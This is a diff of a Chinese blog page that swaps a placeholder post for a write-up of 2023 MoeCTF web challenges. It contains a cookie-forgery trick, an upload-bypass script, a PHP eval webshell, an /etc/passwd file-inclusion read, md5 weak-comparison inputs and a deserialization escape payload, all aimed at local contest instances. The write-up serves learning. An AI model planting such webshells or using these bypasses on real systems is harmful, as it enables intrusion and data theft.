@@ -4,9 +4,13 @@
 
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="Hello World, yyjccc的博客">
-    <meta name="description" content="第一篇博客​	不知道怎么看别人大佬的文章都是好看的博客，也非常系统，然后就想建个自己的博客。成功搭建博客系统。
-">
+    <meta name="keywords" content="2023MoeCTF之web的wp, yyjccc的博客">
+    <meta name="description" content="[2023 MoeCTF] WEB wp环境有问题，我开始还能用自己ip访问，后面突然不行了，这导致不能抓取本地的包，没关系照样做(^-^)
+http签到题一
+
+
+第一眼还没看懂，这应该满足他的条件即可拿到flag
+1和2,分别get和po">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +22,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | yyjccc的博客</title>
+    <title>2023MoeCTF之web的wp | yyjccc的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -322,12 +326,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title">2023MoeCTF之web的wp</h1>
                 </div>
             </div>
         </div>
@@ -351,8 +355,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web/">
-                                <span class="chip bg-color">web</span>
+                            <a href="/tags/ctf/">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/wp/">
+                                <span class="chip bg-color">wp</span>
                             </a>
                         
                     </div>
@@ -367,7 +375,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-07-19
+                    2023-09-12
                 </div>
                 
 
@@ -376,14 +384,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    49
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    4 分
                 </div>
                 
 
@@ -411,7 +419,193 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="第一篇博客"><a href="#第一篇博客" class="headerlink" title="第一篇博客"></a>第一篇博客</h2><p>​	不知道怎么看别人大佬的文章都是好看的博客，也非常系统，然后就想建个自己的博客。成功搭建博客系统。</p>
+                <h1 id="2023-MoeCTF-WEB-wp"><a href="#2023-MoeCTF-WEB-wp" class="headerlink" title="[2023 MoeCTF] WEB wp"></a>[2023 MoeCTF] WEB wp</h1><p>环境有问题，我开始还能用自己ip访问，后面突然不行了，这导致不能抓取本地的包，没关系照样做(^-^)</p>
+<h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p>签到题一</p>
+<img src="\img\9-12\7.png" height="300px">
+
+<p>第一眼还没看懂，这应该满足他的条件即可拿到flag</p>
+<p>1和2,分别get和post传参，</p>
+<p>3.修改Cookie为character为</p>
+<p>4.添加字段X-Forward-For: 127.0.0.1</p>
+<p>5.修改User-Agent内容为MoeBrowser</p>
+<img src="\img\9-12\8.png">
+
+
+
+<h1 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h1><p>签到题二</p>
+<p>解密：</p>
+<pre class="language-none"><code class="language-none">666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c513152475831637959 6c396a61474673624756755a3055684958303 </code></pre>
+
+<p>对密码不是很熟悉，但对这里应该只能是md5、base64、16进制</p>
+<p>一看只能是16进制</p>
+<p>进行16进制解码：<code>flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0</code></p>
+<p>这里面还加了一层base64,</p>
+<p>进行解码：<code>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</code></p>
+<h1 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h1><p>签到题三</p>
+<p>查看源代码搜索注释(&lt;!–)就行（藏得靠后…）</p>
+<img src="\img\9-12\9.png">
+
+
+
+<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>根据他给出的api进行注册和登录，然后获取flag</p>
+<img src="\img\9-12\10.png" height="300px">
+
+<p>提示我们不是admin用户，拿到cookie,</p>
+<p>进行base64解码，得到<code>{"username": "yyj", "password": "123456", "role": "user"}</code></p>
+<p>修改为<code>{"username": "admin", "password": "123456", "role": "admin"}</code></p>
+<p>再进行base64编码得到eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjM0NTYiLCAicm9sZSI6ICJhZG1pbiJ9</p>
+<p>替换Cookie中的token值，再访问flag，得到flag</p>
+<pre class="language-none"><code class="language-none">{"error": "ok", "data": {"flag": "moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}"}}</code></pre>
+
+
+
+<h1 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h1><p>多看了几眼，根据他给的说明，要正确提交正确的表单，</p>
+<img src="/img/9-12/11.png">
+
+<p>然后根据规则，编写python脚本，注意一下Cookie(session)问题，开始还没注意到</p>
+<pre class="language-python" data-language="python"><code class="language-python">import requests
+from bs4 import BeautifulSoup
+
+#默认post参数
+data={
+    "driver": "yyj",
+"steering_control": '0',
+"throttle": '2'
+}
+#url
+url='http://localhost:60713'
+#默认cookie
+cookies={
+    'session': '.eJxtjdsKAiEURf_lPEuoo8fLr2TINKM0UQ6YJxqif0-GHntZsC_s_YZpLa2ut3hZSgMPgXSWOZDjeghkMKtA1qopUM68E6XrvjYD75Tu3OnkuNMEUsni3hTAYK7LM9W-uW3XLkt6tfh7A3_kTJ4Y1JXKDJ4zeLSxttiWewIv0CktLBp7QMlxsIrB30QJ8_kCkKs6Qw.ZQBNlg.s5GIQKXa8JudrZi3dGeeS_T699Q'
+}
+
+
+#精确爬虫，也可以不搞
+def result(res):
+    html=BeautifulSoup(res,'lxml')
+    fl=html.body.div.string
+    if(fl):
+        print('请求结果：',fl)
+    else:
+        print('请求结果：',html.body.div)
+    return res
+
+def setdata(res,data):
+    if '向右' in res:
+        data['steering_control']='-1'
+    elif '向左' in res:
+        data['steering_control']='1'
+    else:
+        print('其他')
+        data['steering_control']='0'
+    if '太小' in res:
+        data['throttle']='0'
+    elif '太大' in res:
+        data['throttle']='2'
+    else:
+        print('其他')
+        data['throttle']='1'
+    return data
+
+for i in range(20):
+    print('第'+str(i)+'次')
+    print('请求数据：',data)
+    res=requests.post(url=url,data=data,cookies=cookies)
+    fl=result(res.text)
+    if(res.cookies):
+        cookies=requests.utils.dict_from_cookiejar(res.cookies)
+    data=setdata(fl,data=data)
+    if 'moectf' in res.text:
+        break
+    print()</code></pre>
+
+<p>跑一下就可以出flag</p>
+<img src="/img/9-12/12.png">
+
+
+
+<h1 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h1><p>经典文件上传处理</p>
+<p>首页查看js源码，查看ajex，发现upload.php</p>
+<img src="/img/9-12/15.png">
+
+<p>进行访问，得到源码</p>
+<img src="/img/9-12/16.png">
+
+<p>对上传文件检查了文件类型，和文件名，关键$fileNameParts&nbsp;=&nbsp;explode(‘.’,&nbsp;$fileName); 将文件名变为数组后，$secondSegment&nbsp;=&nbsp;$fileNameParts[1]; </p>
+<p>固定取下标为1</p>
+<p>绕过：抓包，修改文件类型为image/png,修改文件名为test.png.php</p>
+<p>这里我没抓包，我用的python脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python">import requests
+url ='http://localhost:55163/upload.php'
+file={
+    'file':('test.png.php' #文件名
+            ,open("D:/phpstudy_pro/WWW/upload- picture/link.php",'rb')
+            ,'image/png' #文件类型
+            )
+
+}
+res=requests.post(url,files=file)
+print(res.text)</code></pre>
+
+<p>上传一句话木马成功！</p>
+<img src="/img/9-12/17.png">
+
+<p>这里附上一句话木马（不看就好-*-*）</p>
+<pre class="language-php" data-language="php"><code class="language-php">89504E47
+&lt;?php echo phpinfo();
+@eval($_POST['bb']); ?&gt;</code></pre>
+
+<p>访问验证一下</p>
+<img src="/img/9-12/18.png">
+
+<p>用蚁剑一连，flag就在根目录</p>
+<img src="/img/9-12/19.png">
+
+
+
+<h1 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h1><p>文件上传先试下水，上传成功</p>
+<img src="\img\9-12\1.png">
+
+<p>查看一下图片</p>
+<img src="\img\9-12\2.png">
+
+<p>看这url,应该是用着文件包含，再试试，尝试包含/etc/passwd</p>
+<img src="\img\9-12\3.png">
+
+<p>这里只能显示图片，burp抓下包，这里我改成用python脚本(也一样)</p>
+<img src="\img\9-12\4.png">
+
+<p>ok,成功包含,试下flag</p>
+<img src="\img\9-12\5.png">
+
+<p>居然是个提示(…….),访问一下Fl3g_n0t_Here_dont_peek!!!!!.php</p>
+<p>这里发现是PHP的md5弱比较,不多说了</p>
+<p>最终payload</p>
+<pre class="language-text" data-language="text"><code class="language-text">http://localhost:55371/Fl3g_n0t_Here_dont_peek!!!!!.php?param1=s878926199a&amp;param2=s214587387a</code></pre>
+
+<img src="\img\9-12\6.png">
+
+
+
+<h1 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h1><p>典型的PHP反序列化中的字符串逃逸题目</p>
+<p>访问它包含的文件Hanxin.exe.php ，得到源码，</p>
+<p>对两个页面进行代码审计，发现，关键是反序列化后Spear_Owner 属性为MaoLei 就可获得flag</p>
+<p>而我们可以通过get传参给Chant 属性赋值，恰巧他对序列化的字符串进行了如下的字符串替换</p>
+<img src="/img/9-12/13.png">
+
+<p>所以先写出要逃逸的字符串：	</p>
+<pre class="language-none"><code class="language-none">";s:11:"Spear_Owner";s:6:"MaoLei";}</code></pre>
+
+<p>然后要逃逸的字符总数为35个，</p>
+<p>发现：di_qi_qiang 替换后增加5个字符，di_jiu_qiang 替换后增加20个字符</p>
+<p>因此加入di_qi_qiang 3个，di_jiu_qiang个；序列化后替换后会恰好增加35个字符，然后后面的字符就能逃逸出去，进行反序列化到}结束，就此覆盖了他构造函数对Spear_Owner 赋值，拿到flag</p>
+<p>最终payload</p>
+<pre class="language-none"><code class="language-none">http://localhost:53192/?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_jiu_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}</code></pre>
+
+<img src="/img/9-12/14.png">
+
+
+
 
                 
             </div>
@@ -426,8 +620,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/web/">
-                                    <span class="chip bg-color">web</span>
+                                <a href="/tags/ctf/">
+                                    <span class="chip bg-color">ctf</span>
+                                </a>
+                            
+                                <a href="/tags/wp/">
+                                    <span class="chip bg-color">wp</span>
                                 </a>
                             
                         </div>
@@ -472,7 +670,7 @@
         repo: 'yyjccc.github.io',
         owner: 'Yyjccc',
         admin: "Yyjccc",
-        id: '2023-07-19T19-36-43',
+        id: '2023-09-12T15-47-46',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -504,13 +702,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/07/20/http%E6%A6%82%E8%BF%B0/">
+                <a href="/2023/10/03/2023SHCTF%E4%B9%8Bweb%E7%9A%84wp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="http概述">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="2023SHCTF之web的wp">
                         
-                        <span class="card-title">http概述</span>
+                        <span class="card-title">2023SHCTF之web的wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -521,7 +719,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-20
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-03
                         </span>
                         <span class="publish-author">
                             
@@ -534,8 +732,16 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E5%9F%BA%E7%A1%80/">
-                        <span class="chip bg-color">web基础</span>
+                    <a href="/tags/ctf%E5%85%A5%E9%97%A8/">
+                        <span class="chip bg-color">ctf入门</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%96%B0%E7%94%9F%E8%B5%9Bwp/">
+                        <span class="chip bg-color">新生赛wp</span>
+                    </a>
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
                     </a>
                     
                 </div>
@@ -546,16 +752,16 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/07/19/hello-world/">
+                <a href="/2023/08/28/%E5%85%A5%E9%97%A8flask%E6%A1%86%E6%9E%B6/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Hello World">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="入门flask框架">
                         
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">入门flask框架</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -566,7 +772,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-28
                             </span>
                         <span class="publish-author">
                             
@@ -576,12 +782,19 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
                     <a href="/tags/web/">
                         <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/web%E6%A1%86%E6%9E%B6/">
+                        <span class="chip bg-color">web框架</span>
+                    </a>
+                    
+                    <a href="/tags/python/">
+                        <span class="chip bg-color">python</span>
                     </a>
                     
                 </div>
